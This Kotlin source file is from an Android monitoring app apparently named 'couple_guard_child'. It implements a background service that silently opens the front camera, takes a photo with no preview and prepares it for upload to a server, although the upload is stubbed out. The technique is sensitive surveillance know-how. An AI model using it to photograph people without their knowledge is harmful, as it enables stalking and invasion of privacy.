package com.example.couple_guard_child.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.couple_guard_child.R
import com.example.couple_guard_child.utils.ApiClient
import java.io.File
import java.io.FileOutputStream

/**
 * CameraBackgroundService
 * Workaround untuk capture photo saat app di background
 * Menggunakan Camera2 API dengan invisible surface
 */
class CameraBackgroundService : Service() {
    companion object {
        private const val TAG = "CameraBackgroundService"
        private const val NOTIFICATION_ID = 2001
        private const val CHANNEL_ID = "camera_capture_channel"

        fun startCapture(context: Context, useFrontCamera: Boolean) {
            val intent = Intent(context, CameraBackgroundService::class.java)
            intent.putExtra("use_front_camera", useFrontCamera)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "CameraBackgroundService created")
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "========================================")
        Log.d(TAG, "📸 BACKGROUND CAMERA CAPTURE START")

        // Start as foreground service
        startForeground(NOTIFICATION_ID, createNotification("Capturing photo..."))

        val useFrontCamera = intent?.getBooleanExtra("use_front_camera", true) ?: true
        Log.d(TAG, "Use front camera: $useFrontCamera")

        // Capture photo
        capturePhoto(useFrontCamera)

        return START_NOT_STICKY
    }

    private fun capturePhoto(useFrontCamera: Boolean) {
        try {
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            
            // Find camera
            val cameraId = findCamera(useFrontCamera)
            if (cameraId == null) {
                Log.e(TAG, "❌ Camera not found")
                stopSelfSafely()
                return
            }
            
            Log.d(TAG, "Camera ID: $cameraId")

            // Check permission
            if (checkSelfPermission(android.Manifest.permission.CAMERA) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "❌ No camera permission")
                stopSelfSafely()
                return
            }

            // Setup ImageReader
            imageReader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 2)
            
            imageReader?.setOnImageAvailableListener({ reader ->
                Log.d(TAG, "📸 Image available")
                
                val image = reader.acquireLatestImage()
                if (image != null) {
                    saveAndSendImage(image)
                    image.close()
                }
                
                // Cleanup & stop service
                closeCamera()
                stopSelfSafely()
                
            }, handler)

            // Open camera
            Log.d(TAG, "Opening camera...")
            cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    Log.d(TAG, "✅ Camera opened")
                    cameraDevice = camera
                    takePicture()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "⚠️ Camera disconnected")
                    closeCamera()
                    stopSelfSafely()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "❌ Camera error: $error")
                    closeCamera()
                    stopSelfSafely()
                }
            }, handler)

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to capture photo", e)
            stopSelfSafely()
        }
    }

    private fun findCamera(useFrontCamera: Boolean): String? {
        try {
            val cameraIds = cameraManager?.cameraIdList ?: return null
            
            for (id in cameraIds) {
                val characteristics = cameraManager?.getCameraCharacteristics(id)
                val facing = characteristics?.get(CameraCharacteristics.LENS_FACING)
                
                val targetFacing = if (useFrontCamera) {
                    CameraCharacteristics.LENS_FACING_FRONT
                } else {
                    CameraCharacteristics.LENS_FACING_BACK
                }
                
                if (facing == targetFacing) {
                    return id
                }
            }
            
            // Fallback to first camera
            return cameraIds.firstOrNull()
        } catch (e: Exception) {
            Log.e(TAG, "Error finding camera", e)
            return null
        }
    }

    private fun takePicture() {
        try {
            Log.d(TAG, "Taking picture...")
            
            val captureRequest = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureRequest?.addTarget(imageReader!!.surface)
            
            // Set auto-focus & auto-exposure
            captureRequest?.set(
                CaptureRequest.CONTROL_AF_MODE,
                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE
            )
            captureRequest?.set(
                CaptureRequest.CONTROL_AE_MODE,
                CaptureRequest.CONTROL_AE_MODE_ON
            )

            cameraDevice?.createCaptureSession(
                listOf(imageReader!!.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        Log.d(TAG, "✅ Capture session configured")
                        
                        try {
                            session.capture(
                                captureRequest!!.build(),
                                null,
                                handler
                            )
                            Log.d(TAG, "✅ Capture triggered")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to trigger capture", e)
                            stopSelfSafely()
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "❌ Capture session configure failed")
                        stopSelfSafely()
                    }
                },
                handler
            )

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to take picture", e)
            stopSelfSafely()
        }
    }

    private fun saveAndSendImage(image: android.media.Image) {
        try {
            Log.d(TAG, "Saving image...")
            
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)

            // Save to temp file
            val file = File(cacheDir, "capture_${System.currentTimeMillis()}.jpg")
            FileOutputStream(file).use { output ->
                output.write(bytes)
            }

            Log.d(TAG, "✅ Image saved: ${file.path}")
            Log.d(TAG, "Image size: ${file.length() / 1024} KB")

            // Send to server via ApiClient
            Thread {
                try {
                    // TODO: Call ApiClient to upload
                    // ApiClient.uploadCapturedPhoto(applicationContext, file)
                    
                    Log.d(TAG, "✅ Image upload initiated")
                    
                    // Delete temp file
                    file.delete()
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to upload image", e)
                }
            }.start()

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to save image", e)
        }
    }

    private fun closeCamera() {
        try {
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
            Log.d(TAG, "✅ Camera closed")
        } catch (e: Exception) {
            Log.e(TAG, "Error closing camera", e)
        }
    }

    private fun stopSelfSafely() {
        handler.postDelayed({
            try {
                stopForeground(true)
                stopSelf()
                Log.d(TAG, "========================================")
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping service", e)
            }
        }, 1000)
    }

    private fun createNotification(message: String): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Camera Capture")
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_notification) // Make sure this icon exists
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setAutoCancel(true)

        return builder.build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Camera Capture",
                NotificationManager.IMPORTANCE_LOW
            )
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}